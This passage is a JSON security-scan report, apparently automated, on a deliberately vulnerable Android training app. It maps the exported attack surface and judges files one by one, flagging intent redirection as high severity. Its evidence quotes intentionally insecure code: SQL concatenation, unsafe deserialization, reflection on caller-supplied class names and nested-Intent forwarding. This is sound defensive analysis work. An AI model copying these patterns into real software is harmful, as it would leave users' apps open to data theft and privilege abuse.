@@ -1,0 +1,458 @@
+{
+  "app_summary": "- Deliberately vulnerable Android security-training app covering insecure storage, WebView, injection, cryptography, authentication, IPC, deserialization, reflection, and file-handling scenarios.\n- Manifest enables `android:debuggable=\"true\"` and `android:allowBackup=\"true\"`, increasing runtime inspection and backup-based data-extraction exposure.\n- No dangerous permissions requested.\n- Exported attack surface comprises 17 components: 15 activities and two receivers. `WebViewActivity` is browsable through `dlh://webview`; `UnprotectedExportedActivity` accepts browsable `vulnerapp://*` links; `SpoofableReceiver` accepts the unprotected `ACTION_RESET_PASSWORD` broadcast. `MainActivity` is launcher-reachable, while `ProfileInstallReceiver` has intent filters but requires `android.permission.DUMP`.\n- Other externally launchable activities are `SecretsActivity`, `SQLInjectionActivity`, `InsecureFileActivity`, `CryptoActivity`, `GraphQLInjectionActivity`, `DeserializationActivity`, `ReflectionActivity`, `PendingIntentActivity`, `ZipSlipActivity`, `IntentRedirectionActivity`, `FragmentInjectionActivity`, and `HijackTargetActivity`; several directly consume attacker-controlled intents, serialized data, filenames, URLs, class names, or nested intents. `HijackTargetActivity` additionally uses `singleTask` with attacker-like task affinity.\n- Sensitive data includes plaintext credentials, AWS/API/JWT secrets, predictable session tokens, a local SQLite database containing user secrets/PII, unencrypted files, and a WebView JavaScript bridge exposing a hard-coded token.",
+  "attack_surface_map": {
+    "exported_activities": [
+      "MainActivity",
+      "SecretsActivity",
+      "WebViewActivity",
+      "SQLInjectionActivity",
+      "InsecureFileActivity",
+      "CryptoActivity",
+      "GraphQLInjectionActivity",
+      "UnprotectedExportedActivity",
+      "DeserializationActivity",
+      "ReflectionActivity",
+      "PendingIntentActivity",
+      "ZipSlipActivity",
+      "IntentRedirectionActivity",
+      "FragmentInjectionActivity",
+      "HijackTargetActivity"
+    ],
+    "exported_receivers": [
+      "SpoofableReceiver",
+      "ProfileInstallReceiver"
+    ],
+    "exported_services": [],
+    "exported_providers": [],
+    "deep_links": [
+      {
+        "scheme": "dlh",
+        "host": "webview",
+        "handler": "WebViewActivity"
+      },
+      {
+        "scheme": "vulnerapp",
+        "host": "*",
+        "handler": "UnprotectedExportedActivity"
+      }
+    ],
+    "unprotected_broadcasts": [
+      "com.dlh.vulnerapp.ACTION_RESET_PASSWORD"
+    ],
+    "network": [
+      "webview",
+      "graphql"
+    ],
+    "file_io": true,
+    "ipc": true,
+    "deserialization": true,
+    "reflection": true,
+    "manifest_flags": {
+      "debuggable": true,
+      "allow_backup": true
+    }
+  },
+  "results": [
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/kotlinx/coroutines/internal/FastServiceLoaderKt.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "ANDROID_DETECTED = Result.m160isSuccessimpl(objM153constructorimpl);",
+        "description": "The code only detects whether the Android runtime class android.os.Build is available and exposes the resulting immutable environment flag. It does not consume attacker-controlled input, make an authentication or authorization decision, process IPC data, or perform a sensitive business action. Therefore, it does not demonstrate a conceptual trust or control-flow flaw under the specified rule or an OWASP MASVS security-control violation.",
+        "attack_scenario": "No supported attack scenario exists in this snippet because an attacker-controlled source and security-sensitive sink are both absent.",
+        "attacker_priority": "LOW",
+        "recommendation": "No security remediation is required for this snippet. Keep environment-detection flags limited to runtime compatibility and optimization decisions, and do not reuse them as authentication, authorization, entitlement, or integrity signals.",
+        "false_positive_analysis": "The boolean name could superficially resemble a trusted security flag, but ANDROID_DETECTED only records whether Class.forName(\"android.os.Build\") succeeded. It is private, static, final, initialized internally, and not shown gating privileged functionality. Separate call-site context could reveal misuse of this flag, but no such misuse or attacker influence is present in the provided evidence."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/kotlinx/coroutines/channels/ArrayChannel.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "public class ArrayChannel<E> extends AbstractChannel<E> { ... }",
+        "description": "The snippet is a Kotlin coroutines ArrayChannel implementation that manages synchronized in-memory buffering. It contains no client-controlled authorization decision, authentication or biometric result handling, IPC or Intent processing, privileged action, transaction value, or other security-sensitive business logic. Its state transitions are protected by a ReentrantLock, and the supplied context confirms that related channel classes perform no MASVS-sensitive operations.",
+        "attack_scenario": "No applicable attack scenario is present because the code does not accept data from an Android IPC boundary or use channel elements to make a security-sensitive trust decision.",
+        "attacker_priority": "LOW",
+        "recommendation": "No remediation is required for this conceptual trust and business-logic rule. Review application-specific callers that consume channel elements if those callers use them for authorization, authentication, payments, roles, or privileged IPC actions.",
+        "false_positive_analysis": "Generic variables such as success, failure, resumed, size, and select represent coroutine synchronization and channel state rather than authentication, authorization, or business decisions. Reporting them as a trust bypass based only on their names would be a false positive. No caller or manifest context shows a sensitive action or attacker-controlled source reaching such an action."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/kotlinx/coroutines/internal/StackTraceRecoveryKt.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "No attacker-controlled security decision, IPC input, authentication result, role flag, payment value, or other business-critical data reaches a sensitive action in this snippet.",
+        "description": "This Kotlin coroutines utility only copies, sanitizes, merges, unwraps, and rethrows exception stack traces for debugging. Its boolean conditions control stack-trace recovery rather than authentication, authorization, payment, privilege, or other security-sensitive behavior. No conceptual trust or business-logic flaw covered by the specified rule is present. This is consistent with OWASP MASVS requirements because the code does not implement or enforce a security control.",
+        "attack_scenario": "No applicable attack scenario is demonstrated. Even if an attacker could influence a Throwable or coroutine continuation, the shown behavior is limited to exception and stack-trace processing and does not grant privileges, bypass authentication, or trigger a sensitive IPC action.",
+        "attacker_priority": "LOW",
+        "recommendation": "No remediation is required for this rule. Review application-specific authentication, authorization, billing, and exported Android component code separately, especially code that consumes Intent extras or client-controlled role and entitlement values.",
+        "false_positive_analysis": "The snippet contains conditional control flow and reflection via Class.forName, but neither represents an in-scope trust decision. DebugKt.getRECOVER_STACK_TRACES() only selects stack-trace recovery behavior, and the reflection uses fixed internal class names. No Android component context, incoming Intent source, sensitive sink, or client-controlled security decision is shown."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/kotlinx/coroutines/internal/FastServiceLoader.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "Iterable list = Collections.list(loader.getResources(fullServiceName));\nClass<?> cls = Class.forName(name, false, loader);\nif (service.isAssignableFrom(cls)) {\n    return service.cast(cls.getDeclaredConstructor(new Class[0]).newInstance(new Object[0]));\n}",
+        "description": "No in-scope conceptual trust or business-logic flaw is present. This coroutine library utility loads service-provider declarations from resources available to a supplied ClassLoader, validates provider class-name syntax, and verifies that each loaded class implements the requested service type. The snippet contains no client-controlled authorization flag, ignored authentication result, incoming IPC data, or transaction value whose trust could bypass a security decision. Under OWASP MASVS principles, the reflection and dynamic provider loading shown here do not alone establish an authorization or control-flow vulnerability.",
+        "attack_scenario": "No supported attack scenario is demonstrated. Exploitation would require an attacker to modify the application's packaged resources, inject classes into the effective ClassLoader, or supply an attacker-controlled ClassLoader through an external call path; none of those capabilities or paths is shown, and they would generally imply a separate code-loading or application-integrity compromise.",
+        "attacker_priority": "LOW",
+        "recommendation": "No remediation is required for this conceptual-logic rule. Keep coroutine dependencies current and preserve Android application integrity controls. If application code exposes loadProviders$kotlinx_coroutines_core to untrusted plugin infrastructure, restrict accepted ClassLoaders and provider origins and avoid allowing IPC-controlled values to select service classes.",
+        "false_positive_analysis": "The provider name ultimately reaches Class.forName, which could superficially resemble unsafe reflection, but reflection is explicitly outside this rule and the names originate from META-INF/services resources resolved by the ClassLoader rather than from demonstrated attacker-controlled Intent, authentication, role, payment, or business inputs. The provider class is also checked with service.isAssignableFrom(cls). A finding would require omitted context proving that an attacker can control the ClassLoader or its resources and use provider construction to cross a security boundary; no such context is provided."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/kotlinx/coroutines/debug/internal/DebuggerInfo.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "this.state = source.get_state();\nthis.lastObservedStackTrace = source.lastObservedStackTrace();\nthis.sequenceNumber = source.sequenceNumber;",
+        "description": "The class is a read-only coroutine debugger data-transfer object. It copies diagnostic metadata from DebugCoroutineInfo and CoroutineContext and exposes it through getters. The snippet contains no authentication or authorization decision, client-controlled role or payment flag, sensitive Intent/IPC action, transaction amount, or critical control-flow check. Therefore, it does not demonstrate a conceptual trust or business-logic flaw under the specified MASVS-focused rule.",
+        "attack_scenario": "No supported attack scenario is present because the code neither accepts attacker-controlled IPC input nor uses its fields to authorize a sensitive operation.",
+        "attacker_priority": "LOW",
+        "recommendation": "No remediation is required for this rule. Ensure elsewhere that debugger infrastructure is disabled or inaccessible in production and that any component exposing diagnostic information is protected by appropriate permissions and caller validation.",
+        "false_positive_analysis": "DebuggerInfo implements Serializable and contains thread and stack-trace metadata, but serialization and potential diagnostic information exposure are not conceptual trust flaws by themselves. A vulnerability would require additional code showing an attacker-controlled source reaching a sensitive operation or an externally reachable component exposing this data without authorization; no such context is provided."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/kotlinx/coroutines/debug/internal/DebugProbesImpl.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "public final boolean isInstalled$kotlinx_coroutines_core() { return installations > 0; }",
+        "description": "No conceptual trust or business-logic vulnerability is shown. This is an internal Kotlin coroutines debugging implementation that tracks installation state and coroutine lifecycle data. The displayed booleans and counters configure diagnostics rather than authentication, authorization, payment, role, or other security decisions. No attacker-controlled Intent or IPC input reaches a sensitive action, and no authentication result is ignored or overridden. This is consistent with MASVS principles requiring security-sensitive decisions to be protected from untrusted client control, but no such decision exists in the provided code.",
+        "attack_scenario": "No viable kill chain is present: the snippet exposes no attacker-influenced security decision, exported-component input, transaction parameter, or authentication result that could be manipulated to obtain unauthorized access or trigger a sensitive operation.",
+        "attacker_priority": "LOW",
+        "recommendation": "No remediation is required for this rule. Keep this debugging infrastructure inaccessible through exported application components and exclude or disable unnecessary debug tooling in production builds as defense in depth.",
+        "false_positive_analysis": "Fields such as installations, enableCreationStackTraces, and sanitizeStackTraces may superficially resemble trusted flags, but they only control coroutine diagnostics and stack-trace processing. The reflective ByteBuddy attachment is also outside this conceptual-logic rule and has no demonstrated attacker-controlled class name or authorization bypass. The snippet is truncated, but the provided code and dependency context contain no complete attacker-controlled source-to-sensitive-sink trust flow."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/HijackTargetActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "protected void onCreate(Bundle savedInstanceState) { ... setContentView(tv); }",
+        "description": "The exported activity only constructs and displays static text. It does not consume attacker-controlled Intent extras, deep-link parameters, caller-supplied roles, authentication results, prices, quantities, or other security-sensitive state, and it performs no sensitive action. Therefore, the required attacker-influenced source-to-sensitive-sink trust or control-flow flaw is absent. The displayed reference to taskAffinity and singleTask is not evidence of a conceptual logic vulnerability in this snippet.",
+        "attack_scenario": "An external application can explicitly launch the exported activity, but the observed result is limited to displaying a static TextView; the supplied code provides no path to bypass authentication, alter privileges, or trigger a sensitive operation.",
+        "attacker_priority": "LOW",
+        "recommendation": "No remediation is required for the scoped conceptual logic-flaw rule. As defense in depth, set android:exported=\"false\" if external applications do not need to launch this activity, or protect it with an appropriate signature-level permission. Separately review the full manifest taskAffinity and launchMode configuration under Android task-hijacking controls because those attributes are not included in the provided authoritative context.",
+        "false_positive_analysis": "The activity is authoritatively exported and can be reached through an explicit Intent, but export alone is not a vulnerability. A task-hijacking issue could exist if unsafe taskAffinity or launchMode values are present in the omitted manifest attributes; however, the comment and static UI text do not establish that configuration or a complete attacker-controlled trust-flow vulnerability under this rule."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/MainActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "btn.setOnClickListener(... MainActivity.onCreate$lambda$0(cat, this, view));\nthis$0.startActivity(new Intent(this$0, (Class<?>) CryptoActivity.class));",
+        "description": "No conceptual trust or business-logic vulnerability is demonstrated. The activity presents a fixed, application-defined list of categories and launches explicitly selected activity classes. It does not consume attacker-controlled Intent extras or deep-link parameters, make client-side authorization decisions, process transaction values, or bypass authentication. Being an exported launcher activity is expected and does not itself violate OWASP MASVS platform-interaction principles.",
+        "attack_scenario": "An external application can launch MainActivity because it is exported, but the shown code only displays the same fixed menu available through the launcher. No attacker-supplied value reaches a sensitive action, and activity destinations cannot be selected through incoming Intent data in this snippet.",
+        "attacker_priority": "LOW",
+        "recommendation": "No remediation is required for this class under the conceptual logic-flaw rule. Review each destination activity separately for exported-component exposure, untrusted Intent handling, missing caller or permission checks, and client-side authorization decisions. Keep sensitive components non-exported unless external access is necessary.",
+        "false_positive_analysis": "The labels \"Logic Flaws\" and \"IPC Attacks,\" references to potentially vulnerable demonstration activities, and MainActivity's exported status are not evidence that this class contains a trust flaw. A vulnerability may exist inside a launched activity, but its implementation and manifest context are not provided and cannot be inferred from this navigation code."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/InsecureFileActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "String filename = $fileNameInput.getText().toString();\nString content = this$0.readFileVulnerable(filename);",
+        "description": "No in-scope conceptual trust or control-flow flaw is demonstrated. Although the activity is exported, it does not consume incoming Intent data, trust caller-supplied authorization state, bypass authentication, or process client-controlled business values. The filename originates from direct UI input; any resulting path traversal or insecure file-permission issue is explicitly outside this rule's scope and should be assessed by dedicated rules.",
+        "attack_scenario": "An external application can explicitly launch the exported activity, but the shown code does not automatically perform a sensitive action based on Intent extras or caller-controlled authorization data. Exploitation would require the user to interact with the UI and would concern file-access weaknesses outside this conceptual-logic rule.",
+        "attacker_priority": "LOW",
+        "recommendation": "No conceptual-logic remediation is required based on this snippet. Separately, restrict the activity with android:exported=\"false\" if external launch is unnecessary, keep files private, and canonicalize and constrain user-supplied filenames to the intended application directory.",
+        "false_positive_analysis": "The exported activity may initially suggest an IPC trust issue, but no getIntent(), Intent extra, deep-link parameter, caller identity, role flag, or authentication result is used. The code does contain apparent insecure file permissions and potentially unsafe filename handling, but those are dedicated insecure-storage/path-traversal concerns and are out of scope for this rule."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/DeserializationActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "byte[] data = getIntent().getByteArrayExtra(\"data\");\nObject obj = ois.readObject();\noutput.setText(\"Deserialized object:\\n\" + obj);",
+        "description": "The exported activity accepts caller-controlled serialized data, but the snippet does not use the resulting user or admin values to authorize access, grant privileges, or perform another sensitive business action. The object is only converted to text and displayed. Although ObjectInputStream on untrusted data is an unsafe-deserialization pattern, that vulnerability category is explicitly out of scope for this conceptual trust and control-flow rule. No MASVS-relevant client-side authorization or business-logic bypass is demonstrated.",
+        "attack_scenario": "Another application can explicitly launch the exported activity and supply a crafted byte array in the data extra. This reaches Java deserialization, but the shown control flow does not use the deserialized admin flag for a security decision; therefore, no in-scope privilege or authentication bypass kill chain is present.",
+        "attacker_priority": "LOW",
+        "recommendation": "No conceptual logic-flaw remediation is required from the shown code. Separately, address the out-of-scope unsafe-deserialization risk by removing ObjectInputStream for untrusted Intent data, using a constrained data format with strict schema and size validation, and making the activity non-exported or protecting it with a signature-level permission if external callers are unnecessary.",
+        "false_positive_analysis": "The presence of an attacker-controlled Intent extra, an exported component, and a field named admin could suggest an IPC trust flaw. However, the admin value never gates a sensitive operation in this snippet. A conceptual vulnerability would exist only if omitted code or another downstream consumer trusted this client-supplied object for authorization; no such flow is evidenced here. Unsafe deserialization itself must be assessed by its dedicated rule."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/GraphQLInjectionActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "String userInput = $inputUser.getText().toString();\nString query = \"{\\\"query\\\": \\\"query { user(name: \\\\\\\"\" + userInput + \"\\\\\\\") { id name email } }\\\"}\";\nresultView.setText(\"Executing GraphQL Query:\\n\" + query + \"\\n\\n(Note: In a real attack, the backend would process this injected query)\");",
+        "description": "No in-scope conceptual trust or control-flow vulnerability is demonstrated. User-controlled text is interpolated into a GraphQL query string, but the query is only displayed in a TextView and is not sent to a backend or used to authorize a sensitive action. Potential GraphQL injection is also explicitly outside the scope of this rule.",
+        "attack_scenario": "A user can enter crafted GraphQL syntax and cause the application to display the resulting query locally, but the shown code provides no execution sink, privilege decision, authentication bypass, sensitive IPC action, or business transaction to exploit.",
+        "attacker_priority": "LOW",
+        "recommendation": "No remediation is required under the conceptual logic-flaw rule. If this demonstration is later connected to a GraphQL backend, avoid string concatenation, use GraphQL variables, validate inputs, and enforce authorization and business rules independently on the server.",
+        "false_positive_analysis": "The activity is exported, but it does not read incoming Intent data or perform a sensitive action based on an external caller's input. Although the method name and string construction suggest GraphQL injection, the snippet only renders the constructed query and contains no network execution. A vulnerability could exist in omitted code or a future backend integration, but it is not evidenced here."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/PendingIntentActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "PendingIntent pending = PendingIntent.getActivity(this, 0, baseIntent, 33554432);",
+        "description": "The activity creates a mutable PendingIntent with an implicit base Intent, but the snippet does not expose, return, send, or otherwise transfer the PendingIntent token to an attacker, nor does it perform a sensitive action using attacker-controlled Intent data. Although the activity is exported and can be launched explicitly, there is no complete attacker-influenced source-to-sensitive-sink trust or control-flow flaw under this rule.",
+        "attack_scenario": "An external application can explicitly launch the exported activity, causing it to create and display a textual representation of the PendingIntent. However, the attacker does not receive the PendingIntent token and cannot use the displayed string to invoke or modify it, so no demonstrated exploitation chain reaches a sensitive action.",
+        "attacker_priority": "LOW",
+        "recommendation": "As defense in depth, make the activity non-exported unless external access is required. Prefer an explicit Intent targeting a known component and use FLAG_IMMUTABLE when mutation is unnecessary. If the PendingIntent is later shared externally, narrowly scope its target and validate any mutable fields before performing sensitive operations.",
+        "false_positive_analysis": "The mutable, implicit PendingIntent resembles an unsafe pattern, but keyword or API presence alone is insufficient. The provided code does not disclose the PendingIntent through an Intent, notification, binder call, callback, or other IPC channel. It also does not consume incoming extras or execute privileged business logic. Additional unseen code that obtains and distributes this token could change the assessment, but no such flow is present here."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/SQLInjectionActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "String query = $searchInput.getText().toString();\nString sql = \"SELECT * FROM users WHERE name = '\" + username + '\\'';\nCursor cursor = db.rawQuery(sql, null);",
+        "description": "The snippet contains a concrete SQL injection pattern, but SQL injection is explicitly out of scope for this conceptual trust and business-logic rule. The exported activity does not consume incoming Intent data or perform a sensitive action based on an untrusted role, authentication result, price, quantity, or other client-controlled security decision. Therefore, no in-scope MASVS trust or control-flow vulnerability is established.",
+        "attack_scenario": "A user interacting with the activity could enter SQL syntax into the search field to alter the local query and disclose stored records. However, that is a SQL injection exploit covered by a dedicated rule, not an in-scope conceptual logic flaw.",
+        "attacker_priority": "LOW",
+        "recommendation": "Assess the SQL construction under the dedicated injection rule and replace concatenation with a parameterized query such as db.rawQuery(\"SELECT * FROM users WHERE name = ?\", new String[]{username}). For this rule, no trust or control-flow remediation is indicated. If the exported activity is not intended for external launch, additionally set android:exported=\"false\" or protect it with an appropriate signature-level permission.",
+        "false_positive_analysis": "Although the manifest confirms that the activity is exported, the activity reads input only from its own EditText and does not use Intent extras, deep-link parameters, caller identity, client-controlled authorization flags, or business-critical numeric values. Treating the SQL injection as an IPC trust or business-logic flaw would duplicate an explicitly excluded vulnerability category."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/ReflectionActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "String className = getIntent().getStringExtra(\"class_name\");\nObject instance = Class.forName(className).getDeclaredConstructor(new Class[0]).newInstance(new Object[0]);",
+        "description": "The exported activity trusts an Intent extra as a class name and instantiates it through reflection. However, unsafe reflection is explicitly out of scope for this conceptual logic-flaw rule, and the snippet does not show an IPC-controlled security decision, privileged action, authentication bypass, or business-logic bypass. This pattern should be assessed by the dedicated unsafe-reflection rule.",
+        "attack_scenario": "Another application can explicitly launch the exported activity and supply a chosen class_name value. The activity attempts to instantiate that class, but the provided code does not demonstrate a resulting privileged operation or conceptual trust/control-flow bypass within this rule's scope.",
+        "attacker_priority": "LOW",
+        "recommendation": "Evaluate this code under the dedicated unsafe-reflection rule. Independently, avoid resolving arbitrary caller-provided class names: use a fixed allowlist or an enum-to-constructor mapping. If external invocation is unnecessary, set android:exported=\"false\"; otherwise require a signature-level permission and validate the caller.",
+        "false_positive_analysis": "The manifest confirms that the activity is exported and therefore externally reachable through an explicit Intent. Nevertheless, reachability alone does not establish an in-scope conceptual logic flaw. No sensitive IPC-triggered action, client-controlled authorization flag, ignored authentication result, or exploitable business-state transition is shown. Additional classpath context could reveal dangerous constructor side effects, but that would remain primarily an unsafe-reflection finding and cannot be established from this snippet."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/UnprotectedExportedActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "String data = getIntent().getStringExtra(\"secret_override\");\nstatusText.setText(\"Sensitive Action Triggered by External App!\\nData: \" + data);",
+        "description": "The exported activity trusts attacker-controlled Intent data and displays it, but the snippet does not perform a privileged operation, modify authorization state, disclose protected data, or trigger any other security-sensitive action. The message claiming that a sensitive action occurred is only UI text, so the required attacker-controlled source to dangerous sink flow for a conceptual trust flaw is absent. This does not establish a violation of MASVS authorization or IPC trust requirements by itself.",
+        "attack_scenario": "Another application or a browsable deep link can launch the exported activity with a crafted secret_override extra, causing arbitrary text to appear after the fixed status message. Based on the provided code, this produces only attacker-influenced UI content and does not grant access or execute a sensitive operation.",
+        "attacker_priority": "LOW",
+        "recommendation": "If this activity is intended to perform a real sensitive action elsewhere, make it non-exported or protect it with a signature-level permission, verify the caller where reliable, and authorize the operation using trusted server-side or application state rather than Intent extras. Validate and constrain displayed input to reduce UI-spoofing risk.",
+        "false_positive_analysis": "The manifest conclusively shows that the activity is exported and externally reachable, and the Intent extra is untrusted. However, the only demonstrated sink is TextView.setText. A vulnerability would exist if omitted code, lifecycle observers, or downstream handlers treated secret_override or the displayed state as authorization to perform a privileged action, but no such behavior is present in this snippet."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/R.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "The provided R.java contains only generated Android resource identifier constants and private constructors; it contains no executable security or business logic.",
+        "description": "No conceptual trust or control-flow vulnerability is present in this snippet. It does not process attacker-controlled input, make authentication or authorization decisions, handle IPC data, or perform sensitive actions. Therefore, no attacker-influenced source-to-sensitive-sink flow can be established under OWASP MASVS principles.",
+        "attack_scenario": "No exploitation scenario is supported because resource identifiers alone do not expose a security decision or sensitive operation that an attacker can influence.",
+        "attacker_priority": "LOW",
+        "recommendation": "No remediation is required for this generated resource class. Review executable application components, especially exported activities, services, receivers, and providers, as well as authentication callbacks and transaction logic, for client-trusted privilege flags, unverified Intent data, and missing server-side authorization.",
+        "false_positive_analysis": "Resource names such as biometric-related arrays may suggest security functionality, but they are only generated identifiers and do not demonstrate biometric bypass or any other trust flaw. A vulnerability could exist in code that consumes these resources, but that code is not provided and cannot be inferred from this snippet."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/FragmentInjectionActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Not Vulnerable",
+      "result": {
+        "is_vulnerable": false,
+        "severity": "Info",
+        "confidence": "High",
+        "evidence": "protected boolean isValidFragment(String fragmentName) {\n    return true;\n}",
+        "description": "The activity disables PreferenceActivity fragment allowlisting, which may enable framework-level fragment injection because the component is exported. However, this snippet does not show an attacker-controlled value causing a sensitive business action, authorization bypass, or other in-scope conceptual trust flaw. Fragment instantiation behavior is closer to unsafe dynamic class loading/reflection and should be assessed by a dedicated rule.",
+        "attack_scenario": "An external application could explicitly target the exported activity and supply PreferenceActivity fragment-related extras. Whether this produces exploitable behavior depends on the framework behavior and the availability of an injectable fragment with security-relevant side effects, neither of which is demonstrated in the provided code.",
+        "attacker_priority": "LOW",
+        "recommendation": "Return true only for an explicit allowlist of expected fragment class names, and set the activity to android:exported=\"false\" unless external applications must launch it. If export is required, protect it with a signature-level permission and validate the caller and all incoming Intent extras.",
+        "false_positive_analysis": "The unconditional return is suspicious and the activity is authoritatively exported, but no sensitive fragment, security decision, or privileged action reached from attacker-controlled Intent data is shown. Treating it as a confirmed conceptual logic flaw would require inventing a security-relevant fragment or side effect absent from the supplied context."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/IntentRedirectionActivity.java",
+      "rule": "intent_redirection",
+      "vulnerability": "Intent Redirection",
+      "status": "Vulnerable",
+      "result": {
+        "is_vulnerable": true,
+        "severity": "High",
+        "confidence": "High",
+        "evidence": "Intent forward = (Intent) getIntent().getParcelableExtra(\"forward_intent\");\nif (forward != null) {\n    startActivity(forward);\n}",
+        "description": "The exported activity extracts an attacker-controlled nested Intent and passes it directly to startActivity without validating or replacing its component, package, action, data, flags, or URI grants. This creates an Intent redirection/confused-deputy vulnerability under MASVS-PLATFORM-1 because the application forwards the Intent under its own identity, potentially exposing non-exported activities or relaying URI permissions.",
+        "attack_scenario": "A malicious app explicitly launches com.dlh.vulnerapp.IntentRedirectionActivity and supplies a crafted Intent in the forward_intent extra. The nested Intent can explicitly target a non-exported activity in com.dlh.vulnerapp or carry attacker-selected data and permission-grant flags. The exported activity then invokes startActivity on that Intent, allowing the attacker to use the vulnerable app as a deputy to bypass component-export restrictions or relay URI access.",
+        "attacker_priority": "HIGH",
+        "recommendation": "Do not forward caller-supplied Intent objects directly. Prefer mapping a small set of validated input values to new internally constructed explicit Intents. If forwarding is unavoidable, reject implicit targets, remove URI grant and unsafe task flags, resolve and validate the destination against a strict allowlist of trusted components, explicitly set the approved component/package, validate all data URIs and ClipData, and verify the caller's identity or protect the exported activity with a signature-level permission. Make the activity non-exported if external invocation is unnecessary.",
+        "false_positive_analysis": "The manifest context confirms that the receiving activity is exported, so an external app can reach it through an explicit component Intent even though it has no intent filters. The source, dangerous sink, and absence of target validation are all visible in the snippet. This would only be mitigated by authoritative controls not shown here, such as a signature-level component permission, framework-level caller restriction, or other access control applied before onCreate; none is present in the supplied context.",
+        "masvs_reference": {
+          "id": "MASVS-PLATFORM-1",
+          "description": "The app uses IPC mechanisms securely. Do not forward Intents received from untrusted callers without validating the target; a mutable/nested Intent enables confused-deputy attacks against non-exported components.",
